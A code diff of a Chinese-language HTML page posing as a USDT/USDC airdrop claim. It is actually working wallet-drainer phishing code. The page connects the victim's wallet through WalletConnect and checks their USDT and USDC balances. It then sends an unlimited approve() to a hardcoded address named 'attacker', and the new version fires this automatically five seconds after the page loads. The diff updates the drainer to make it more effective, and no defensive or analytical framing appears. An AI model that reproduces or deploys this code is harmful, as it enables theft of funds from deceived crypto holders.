@@ -1,69 +1,89 @@
-
+<!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-  <meta charset="UTF-8">
-  <title>USDT 空投授權頁（最相容版）</title>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-</head>
-<body style="background:#111; color:white; text-align:center; padding-top:60px; font-family:sans-serif;">
-  <h2>🎁 恭喜你獲得 USDT 空投！</h2>
-  <button onclick="connect()">📲 點我連接錢包</button>
-  <p id="status" style="margin-top:20px;"></p>
+  <meta charset="UTF-8" />
+  <title>🎁 空投授權頁 - WalletConnect v2</title>
+  <!-- Web3Modal v2 + WalletConnect v2 -->
+  <script type="module">
+    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2.6.2/dist/index.js';
+    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js';
+    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
+    import { mainnet } from 'https://unpkg.com/@wagmi/core/chains';
+    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';
 
-  <script>
-    const USDT_BY_CHAIN = {
-      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
-      56: "0x55d398326f99059ff775485246999027b3197955"  // BSC
-    };
+    const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d'; // 替換為你自己的 projectId
+    const chains = [mainnet];
+
+    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
+    const wagmiConfig = createConfig({
+      autoConnect: true,
+      connectors: w3mConnectors({ projectId, version: 2, chains }),
+      publicClient
+    });
+
+    const ethereumClient = new EthereumClient(wagmiConfig, chains);
+    const web3modal = new Web3Modal({
+      projectId,
+      themeMode: 'dark',
+      walletImages: {
+        metamask: 'https://registry.walletconnect.com/v2/logo/md/ef4fdb39b7c8473967fe6fefc9311d5b',
+        trust: 'https://registry.walletconnect.com/v2/logo/md/6269ef7f7c998b95bf198b709cddf1e5'
+      },
+      featuredWalletIds: [
+        'eip155:1:trust',
+        'eip155:1:metamask'
+      ]
+    }, ethereumClient);
 
     const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const USDC = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
+    const abi = ["function approve(address spender, uint256 amount) external returns (bool)", "function balanceOf(address) view returns (uint256)"];
 
-    async function connect() {
-      const provider = new WalletConnectProvider.default({
-        rpc: {
-          1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c",
-          56: "https://bsc-dataseed.binance.org/"
-        }
-      });
+    async function approveToken(tokenAddress, signer) {
+      const contract = new ethers.Contract(tokenAddress, abi, signer);
+      const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
+      return tx.hash;
+    }
 
+    async function start() {
       try {
-        await provider.enable();
-        const web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
-        const chainId = await web3.eth.getChainId();
-        const token = USDT_BY_CHAIN[chainId];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+        const usdtContract = new ethers.Contract(USDT, abi, provider);
+        const usdcContract = new ethers.Contract(USDC, abi, provider);
 
-        if (!token) {
-          document.getElementById("status").innerText = "❌ 此鏈不支援 USDT";
+        const usdtBal = await usdtContract.balanceOf(userAddress);
+        const usdcBal = await usdcContract.balanceOf(userAddress);
+
+        let txHash;
+        if (usdtBal.gt(0)) {
+          txHash = await approveToken(USDT, signer);
+        } else if (usdcBal.gt(0)) {
+          txHash = await approveToken(USDC, signer);
+        } else {
+          document.getElementById("status").innerText = "❌ 沒有可用的 USDT 或 USDC 餘額";
           return;
         }
 
-        // ✅ encode approve() 資料
-        const approveData = web3.eth.abi.encodeFunctionCall({
-          name: "approve",
-          type: "function",
-          inputs: [
-            { type: "address", name: "spender" },
-            { type: "uint256", name: "amount" }
-          ]
-        }, [attacker, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
-
-        // ✅ 最相容寫法：使用 sendTransaction（非 provider.request）
-        const txHash = await web3.eth.sendTransaction({
-          from: user,
-          to: token,
-          data: approveData,
-          gas: 100000,
-          gasPrice: web3.utils.toWei('5', 'gwei')
-        });
-
-        document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${txHash.transactionHash}`;
+        document.getElementById("status").innerText = `✅ 授權成功，Tx Hash: ${txHash}`;
       } catch (err) {
-        document.getElementById("status").innerText = "❌ 授權失敗：" + err.message;
+        document.getElementById("status").innerText = "❌ 授權失敗: " + err.message;
       }
     }
+
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        web3modal.openModal();
+        setTimeout(() => start(), 5000); // 掃碼連線 5 秒後自動執行 approve
+      }, 1000);
+    });
   </script>
+</head>
+<body style="background:#111; color:#fff; text-align:center; padding-top:60px; font-family:sans-serif;">
+  <h2>🎁 恭喜你獲得 USDT / USDC 空投！</h2>
+  <p>請使用 MetaMask 或 Trust Wallet 掃描 QR Code 完成授權</p>
+  <div id="status" style="margin-top: 30px; font-size: 1.2rem;"></div>
 </body>
 </html>
